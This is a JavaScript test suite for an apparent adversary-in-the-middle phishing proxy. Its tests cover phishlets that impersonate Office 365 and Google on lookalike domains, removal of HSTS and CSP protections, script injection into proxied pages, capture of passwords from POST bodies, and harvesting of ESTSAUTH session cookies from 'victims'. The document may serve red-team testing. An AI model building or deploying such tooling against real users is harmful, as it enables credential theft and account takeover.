'use strict';

/**
 * HECATE — Phase 4 Evil Proxy Test Suite
 * Tests all pure components in isolation. No network, no DB.
 *
 * Run: node --test modules/evil-proxy/evil-proxy.test.js
 */

const { describe, it, before, beforeEach } = require('node:test');
const assert = require('node:assert/strict');

// ═════════════════════════════════════════════════════════════════════════════
// PHISHLET: Schema
// ═════════════════════════════════════════════════════════════════════════════

describe('Phishlet: schema', () => {
  const { validate, normalise, EXAMPLES } = require('./phishlet/schema');

  it('validates a correct phishlet without throwing', () => {
    assert.doesNotThrow(() => validate(EXAMPLES['o365'], 'o365'));
  });

  it('throws on missing name', () => {
    const bad = { ...EXAMPLES['o365'], name: undefined };
    assert.throws(() => validate(bad), /missing required field 'name'/);
  });

  it('throws on empty proxyHosts', () => {
    const bad = { ...EXAMPLES['o365'], proxyHosts: [] };
    assert.throws(() => validate(bad), /proxyHosts must be a non-empty array/);
  });

  it('throws on proxyHost missing domain', () => {
    const bad = { ...EXAMPLES['o365'], proxyHosts: [{ phishSub: 'x', origSub: 'x' }] };
    assert.throws(() => validate(bad), /domain required/);
  });

  it('throws on authTokens with empty keys', () => {
    const bad = { ...EXAMPLES['o365'], authTokens: [{ domain: '.test.com', keys: [] }] };
    assert.throws(() => validate(bad), /keys must be non-empty/);
  });

  it('normalise() compiles credential regexes', () => {
    const n = normalise(EXAMPLES['o365']);
    assert.ok(n.credentials.every(c => c.re instanceof RegExp));
  });

  it('normalise() sets defaults', () => {
    const n = normalise(EXAMPLES['generic-login']);
    assert.equal(n.enabled, true);
    assert.equal(n.forceHttps, true);
  });

  it('EXAMPLES has at least 3 built-in phishlets', () => {
    assert.ok(Object.keys(EXAMPLES).length >= 3);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// PHISHLET: Loader + Store
// ═════════════════════════════════════════════════════════════════════════════

describe('Phishlet: loader', () => {
  const { load, loadObject, list, EXAMPLES } = require('./phishlet/loader');

  it('loads a built-in phishlet by name', () => {
    const p = load('o365');
    assert.equal(p.name, 'o365');
    assert.ok(p.proxyHosts.length > 0);
  });

  it('throws on unknown phishlet name', () => {
    assert.throws(() => load('nonexistent-phishlet'), /not found/);
  });

  it('loadObject() validates and normalises', () => {
    const p = loadObject(EXAMPLES['google']);
    assert.equal(p.name, 'google');
    assert.ok(p.credentials.every(c => c.re instanceof RegExp));
  });

  it('list() includes built-in names', () => {
    const names = list();
    assert.ok(names.includes('o365'));
    assert.ok(names.includes('google'));
  });
});

describe('Phishlet: store', () => {
  const store = require('./phishlet/store');

  before(() => store.clear());

  it('addLure() returns a lure ID', () => {
    const id = store.addLure({
      engagementId: 'eng-1',
      phishletName: 'o365',
      phishDomain:  'login-secure.io',
    });
    assert.ok(id.startsWith('lure-'));
  });

  it('getLure() retrieves a registered lure', () => {
    const id = store.addLure({
      engagementId: 'eng-1',
      phishletName: 'google',
      phishDomain:  'accounts-google.net',
    });
    const lure = store.getLure(id);
    assert.equal(lure.phishDomain, 'accounts-google.net');
    assert.ok(lure.hostMap instanceof Map);
  });

  it('getLureByHost() resolves phishing hostname to lure', () => {
    const id = store.addLure({
      engagementId: 'eng-2',
      phishletName: 'o365',
      phishDomain:  'ms-login.net',
    });
    const lure = store.getLureByHost('login.ms-login.net');
    assert.ok(lure);
    assert.equal(lure.id, id);
  });

  it('hostMap maps phish host → origin host', () => {
    const id   = store.addLure({
      engagementId: 'eng-3',
      phishletName: 'o365',
      phishDomain:  'msonline.xyz',
    });
    const lure = store.getLure(id);
    const origHost = lure.hostMap.get('login.msonline.xyz');
    assert.equal(origHost, 'login.microsoftonline.com');
  });

  it('disableLure() removes from host index', () => {
    const id = store.addLure({
      engagementId: 'eng-4',
      phishletName: 'o365',
      phishDomain:  'ms-secure.org',
    });
    store.disableLure(id);
    const lure = store.getLureByHost('login.ms-secure.org');
    assert.equal(lure, null);
  });

  it('listLures() filters by engagementId', () => {
    store.clear();
    store.addLure({ engagementId: 'eid-A', phishletName: 'o365', phishDomain: 'a.io' });
    store.addLure({ engagementId: 'eid-B', phishletName: 'google', phishDomain: 'b.io' });
    const forA = store.listLures('eid-A');
    assert.equal(forA.length, 1);
    assert.equal(forA[0].engagementId, 'eid-A');
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// PROXY: Rewriter
// ═════════════════════════════════════════════════════════════════════════════

describe('Proxy: rewriter', () => {
  const rw = require('./proxy/rewriter');

  const reverseMap = new Map([
    ['login.microsoftonline.com', 'login.ms-phish.io'],
    ['account.microsoft.com',     'account.ms-phish.io'],
  ]);

  it('rewriteBody() replaces https origin URLs', () => {
    const body = '<a href="https://login.microsoftonline.com/path">Link</a>';
    const out  = rw.rewriteBody(body, reverseMap);
    assert.ok(out.includes('login.ms-phish.io'));
    assert.ok(!out.includes('microsoftonline.com'));
  });

  it('rewriteBody() replaces scheme-relative URLs', () => {
    const body = 'src="//login.microsoftonline.com/lib.js"';
    const out  = rw.rewriteBody(body, reverseMap);
    assert.ok(out.includes('//login.ms-phish.io'));
  });

  it('rewriteBody() handles empty map gracefully', () => {
    const body = '<p>unchanged</p>';
    assert.equal(rw.rewriteBody(body, new Map()), body);
  });

  it('rewriteHeaders() removes HSTS', () => {
    const headers = { 'strict-transport-security': 'max-age=31536000', 'x-custom': 'kept' };
    const out     = rw.rewriteHeaders(headers, reverseMap, 'login.ms-phish.io');
    assert.equal(out['strict-transport-security'], undefined);
    assert.equal(out['x-custom'], 'kept');
  });

  it('rewriteHeaders() rewrites Location header', () => {
    const headers = { 'location': 'https://login.microsoftonline.com/next' };
    const out     = rw.rewriteHeaders(headers, reverseMap, 'login.ms-phish.io');
    assert.ok(out['location'].includes('ms-phish.io'));
  });

  it('rewriteHeaders() strips content-length', () => {
    const headers = { 'content-length': '1234' };
    const out     = rw.rewriteHeaders(headers, reverseMap, 'login.ms-phish.io');
    assert.equal(out['content-length'], undefined);
  });

  it('rewriteSetCookie() rewrites domain attribute', () => {
    const headers = ['ESTSAUTH=abc; Domain=.microsoftonline.com; Path=/; Secure; HttpOnly'];
    const out     = rw.rewriteSetCookie(headers, reverseMap);
    assert.ok(out[0].includes('ms-phish.io'));
    assert.ok(!out[0].includes('microsoftonline'));
  });

  it('rewriteSetCookie() adds SameSite=None', () => {
    const headers = ['session=xyz; Path=/; SameSite=Strict'];
    const out     = rw.rewriteSetCookie(headers, new Map([['a.com', 'b.io']]));
    assert.ok(out[0].includes('SameSite=None'));
    assert.ok(!out[0].includes('SameSite=Strict'));
  });

  it('rewriteCSP() strips report-uri', () => {
    const csp = "default-src 'self'; report-uri https://csp.example.com/r";
    const out = rw.rewriteCSP(csp, reverseMap);
    assert.ok(!out.includes('report-uri'));
  });

  it('rewriteCSP() adds unsafe-inline to script-src', () => {
    const csp = "script-src 'self'; default-src 'none'";
    const out = rw.rewriteCSP(csp, reverseMap);
    assert.ok(out.includes('unsafe-inline'));
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// PROXY: Injector
// ═════════════════════════════════════════════════════════════════════════════

describe('Proxy: injector', () => {
  const inj = require('./proxy/inject');

  it('inject() inserts script before </body>', () => {
    const html = '<html><body><p>Hello</p></body></html>';
    const out  = inj.inject(html, 'lure-1', 'phish.io');
    assert.ok(out.indexOf('<script') < out.indexOf('</body>'));
    assert.ok(out.includes('data-hecate="1"'));
  });

  it('inject() appends script when no </body> tag', () => {
    const html = '<p>No body tag</p>';
    const out  = inj.inject(html, 'lure-1', 'phish.io');
    assert.ok(out.includes('data-hecate="1"'));
  });

  it('inject() includes lureId in payload', () => {
    const out = inj.inject('<body></body>', 'lure-XYZ', 'phish.io');
    assert.ok(out.includes('lure-XYZ'));
  });

  it('inject() includes phishDomain in payload', () => {
    const out = inj.inject('<body></body>', 'lure-1', 'my-phish.net');
    assert.ok(out.includes('my-phish.net'));
  });

  it('isInjected() correctly identifies already-injected pages', () => {
    const clean    = '<html><body></body></html>';
    const injected = inj.inject(clean, 'l', 'd.io');
    assert.equal(inj.isInjected(clean), false);
    assert.equal(inj.isInjected(injected), true);
  });

  it('inject() returns body unchanged on null/empty input', () => {
    assert.equal(inj.inject(null, 'l', 'd.io'), null);
    assert.equal(inj.inject('', 'l', 'd.io'), '');
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// HARVEST: Cookie Jar
// ═════════════════════════════════════════════════════════════════════════════

describe('Harvest: cookie-jar', () => {
  const cj = require('./harvest/cookie-jar');

  const O365_TOKENS = [
    { domain: '.microsoftonline.com', keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid'] },
  ];

  it('parseCookie() parses name and value', () => {
    const c = cj.parseCookie('session=abc123; Path=/; Secure');
    assert.equal(c.name, 'session');
    assert.equal(c.value, 'abc123');
  });

  it('parseCookie() parses domain and flags', () => {
    const c = cj.parseCookie('ESTSAUTH=xyz; Domain=.microsoftonline.com; HttpOnly; Secure');
    assert.equal(c.domain, '.microsoftonline.com');
    assert.equal(c.httpOnly, true);
    assert.equal(c.secure, true);
  });

  it('parseCookie() returns null on malformed input', () => {
    assert.equal(cj.parseCookie(''), null);
    assert.equal(cj.parseCookie(null), null);
    assert.equal(cj.parseCookie('no-equals-sign'), null);
  });

  it('parseAll() handles string and array inputs', () => {
    const s = 'a=1; Path=/';
    const a = ['a=1; Path=/', 'b=2'];
    assert.equal(cj.parseAll(s).length, 1);
    assert.equal(cj.parseAll(a).length, 2);
  });

  it('matchAuthToken() matches known auth token name', () => {
    const c   = cj.parseCookie('ESTSAUTH=abc; Domain=.microsoftonline.com');
    const { matched } = cj.matchAuthToken(c, O365_TOKENS);
    assert.equal(matched, true);
  });

  it('matchAuthToken() rejects non-matching name', () => {
    const c   = cj.parseCookie('JSESSIONID=abc; Domain=.microsoftonline.com');
    const { matched } = cj.matchAuthToken(c, O365_TOKENS);
    assert.equal(matched, false);
  });

  it('harvest() extracts matching auth tokens', () => {
    const headers = [
      'ESTSAUTH=token1; Domain=.microsoftonline.com; Secure; HttpOnly',
      'buid=token2; Domain=.microsoftonline.com; Secure',
      'irrelevant=token3; Domain=.microsoftonline.com',
    ];
    const captured = cj.harvest(headers, O365_TOKENS);
    assert.equal(captured.length, 2);
    assert.ok(captured.some(c => c.name === 'ESTSAUTH'));
    assert.ok(captured.some(c => c.name === 'buid'));
  });

  it('harvest() returns empty array when no matches', () => {
    const headers = ['sessionid=abc; Domain=.other.com'];
    assert.equal(cj.harvest(headers, O365_TOKENS).length, 0);
  });

  it('isSessionComplete() reports complete when all tokens captured', () => {
    const { complete } = cj.isSessionComplete(['ESTSAUTH', 'ESTSAUTHPERSISTENT'], O365_TOKENS);
    assert.equal(complete, true);
  });

  it('isSessionComplete() reports incomplete with missing tokens', () => {
    const { complete, missing } = cj.isSessionComplete([], O365_TOKENS);
    assert.equal(complete, false);
    assert.ok(missing.length > 0);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// HARVEST: Credential Capture
// ═════════════════════════════════════════════════════════════════════════════

describe('Harvest: credential-capture', () => {
  const cc = require('./harvest/credential-capture');

  const PATTERNS = [
    { key: 'username', search: 'login=([^&]+)',  re: /login=([^&]+)/i,  type: 'post' },
    { key: 'password', search: 'passwd=([^&]+)', re: /passwd=([^&]+)/i, type: 'post' },
  ];

  it('captures from URL-encoded body', () => {
    const r = cc.capture('login=user%40corp.com&passwd=S3cur3P%40ss', 'application/x-www-form-urlencoded', PATTERNS);
    assert.equal(r.found, true);
    assert.equal(r.credentials.username, 'user@corp.com');
    assert.ok(r.credentials.password);
  });

  it('captures from JSON body', () => {
    const jsonPatterns = [
      { key: 'username', search: '"email":"([^"]+)"', re: /"email":"([^"]+)"/i, type: 'post' },
      { key: 'password', search: '"pass":"([^"]+)"',  re: /"pass":"([^"]+)"/i,  type: 'post' },
    ];
    const body = JSON.stringify({ email: 'user@corp.com', pass: 'P@ssw0rd' });
    const r    = cc.capture(body, 'application/json', jsonPatterns);
    assert.equal(r.found, true);
  });

  it('returns found:false on empty body', () => {
    const r = cc.capture('', 'application/x-www-form-urlencoded', PATTERNS);
    assert.equal(r.found, false);
  });

  it('returns found:false when patterns dont match', () => {
    const r = cc.capture('a=1&b=2', 'application/x-www-form-urlencoded', PATTERNS);
    assert.equal(r.found, false);
  });

  it('parseUrlEncoded() handles encoded values', () => {
    const r = cc.parseUrlEncoded('name=John+Doe&email=john%40example.com');
    assert.equal(r.name, 'John Doe');
    assert.equal(r.email, 'john@example.com');
  });

  it('parseJson() flattens top-level fields', () => {
    const r = cc.parseJson('{"user":"alice","pass":"secret"}');
    assert.equal(r.user, 'alice');
  });

  it('redact() masks credential values', () => {
    const masked = cc.redact({ password: 'SuperSecret123' });
    assert.ok(masked.password.includes('*'));
    assert.ok(!masked.password.includes('SuperSecret'));
    assert.ok(masked.password.includes('[14]'));
  });

  it('isAuthUrl() matches known auth paths', () => {
    assert.equal(cc.isAuthUrl('/kmsi', ['/kmsi', '/token']), true);
    assert.equal(cc.isAuthUrl('/unknown', ['/kmsi', '/token']), false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// HARVEST: Session Monitor
// ═════════════════════════════════════════════════════════════════════════════

describe('Harvest: session-monitor', () => {
  const sm = require('./harvest/session-monitor');

  const PHISHLET = {
    name:       'o365',
    authTokens: [{ domain: '.microsoftonline.com', keys: ['ESTSAUTH'] }],
  };

  before(() => { sm.clear(); sm.stopCleanup(); });

  it('getOrCreate() creates a new session', () => {
    const s = sm.getOrCreate('lure-1', 'victim-A', 'eng-1', PHISHLET);
    assert.equal(s.state, 'active');
    assert.equal(s.victimSid, 'victim-A');
  });

  it('getOrCreate() returns same session on second call', () => {
    const s1 = sm.getOrCreate('lure-1', 'victim-A', 'eng-1', PHISHLET);
    const s2 = sm.getOrCreate('lure-1', 'victim-A', 'eng-1', PHISHLET);
    assert.equal(s1 === s2, true);
  });

  it('recordVisit() tracks visited URLs', () => {
    sm.getOrCreate('lure-1', 'victim-B', 'eng-1', PHISHLET);
    sm.recordVisit('lure-1', 'victim-B', 'https://login.phish.io/');
    const s = sm.get('lure-1', 'victim-B');
    assert.ok(s.visitedUrls.includes('https://login.phish.io/'));
  });

  it('recordCredentials() transitions state to auth', () => {
    sm.getOrCreate('lure-1', 'victim-C', 'eng-1', PHISHLET);
    sm.recordCredentials('lure-1', 'victim-C', { username: 'user@corp.com', password: 'P@ss' });
    const s = sm.get('lure-1', 'victim-C');
    assert.equal(s.state, 'auth');
    assert.equal(s.capturedCredentials.username, 'user@corp.com');
  });

  it('recordCookies() transitions to harvested when all tokens captured', () => {
    sm.getOrCreate('lure-1', 'victim-D', 'eng-1', PHISHLET);
    sm.recordCookies('lure-1', 'victim-D', [
      { name: 'ESTSAUTH', value: 'session_token_here', domain: '.microsoftonline.com', capturedAt: new Date().toISOString() }
    ]);
    const s = sm.get('lure-1', 'victim-D');
    assert.equal(s.state, 'harvested');
    assert.ok(s.harvestedAt);
  });

  it('list() filters by state', () => {
    const harvested = sm.list({ state: 'harvested' });
    assert.ok(harvested.every(s => s.state === 'harvested'));
  });

  it('list() strips private _phishlet field', () => {
    const all = sm.list({});
    assert.ok(all.every(s => !('_phishlet' in s)));
  });

  it('stats() returns counts by state', () => {
    const s = sm.stats();
    assert.ok(typeof s.total === 'number');
    assert.ok(s.byState);
  });
});

describe('Evil Proxy: regression hardening', () => {
  it('rejects path traversal in phishlet names', () => {
    const loader = require('./phishlet/loader');
    loader.setPhishletDir('/tmp/hecate-phishlets');
    assert.throws(() => loader.load('../outside'), /Invalid phishlet name/);
  });
});
